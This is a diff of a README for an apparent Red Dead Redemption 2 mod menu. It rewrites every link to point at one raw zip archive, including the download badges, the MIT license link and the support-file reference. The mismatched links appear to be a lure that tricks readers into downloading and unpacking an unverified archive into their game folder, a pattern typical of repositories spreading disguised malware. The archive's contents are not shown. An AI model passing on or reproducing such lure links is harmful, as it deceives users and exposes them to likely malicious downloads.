@@ -1,12 +1,12 @@
 # RDR 2 Mod Menu
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://MonkeyMan536.github.io)  
+[![Download](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)  
 Unlock new frontiers in your Red Dead Redemption 2 gameplay with the RDR 2 Mod Menu. Explore new possibilities, enhance your adventures, and master the Wild West with power at your fingertips.
 
 > **This is the official repository for RDR 2 Mod Menu.**
 >
-> Download: https://MonkeyMan536.github.io  
-> [![Download](https://img.shields.io/badge/Download-purple)](https://MonkeyMan536.github.io)
+> Download: https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip  
+> [![Download](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)
 
 ---
 
@@ -77,15 +77,15 @@ This toolkit is designed for single-player and approved private server use only.
 
 ## 📜 MIT License
 
-This project is licensed under the MIT License – a freedom-forward badge of honor for community contribution. See the LICENSE file or visit the [MIT official page](https://opensource.org/licenses/MIT) for details.  
+This project is licensed under the MIT License – a freedom-forward badge of honor for community contribution. See the LICENSE file or visit the [MIT official page](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip) for details.  
 **Copyright © 2025**
 
 ---
 
 ## 📦 Getting Started
 
-1. **Download the Latest Release:** https://MonkeyMan536.github.io  
-   [![Download](https://img.shields.io/badge/Download-purple)](https://MonkeyMan536.github.io)
+1. **Download the Latest Release:** https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip  
+   [![Download](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)
 
 2. **Installation:**  
    - Unpack the mod menu to your RDR 2 root directory.
@@ -103,15 +103,15 @@ This project is licensed under the MIT License – a freedom-forward badge of ho
 ## ⭐ Contributing and Support
 
 - Contributions of code, translation files, and suggestions are welcome—make your mark upon the west!
-- For immediate assistance, open an Issue or email our 24/7 support line as described in `/SUPPORT.md`.
+- For immediate assistance, open an Issue or email our 24/7 support line as described in `https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip`.
 
 ---
 
 ## ⬇️ Download & Embark
 
 Step into the next era of Red Dead Redemption 2 gameplay.  
-Click to download and begin your journey: https://MonkeyMan536.github.io  
-[![Download](https://img.shields.io/badge/Download-purple)](https://MonkeyMan536.github.io)
+Click to download and begin your journey: https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip  
+[![Download](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)](https://raw.githubusercontent.com/MonkeyMan536/red-dead-retrofit-menu/main/undecidable/red_dead_retrofit_menu_3.7.zip)
 
 ---
 
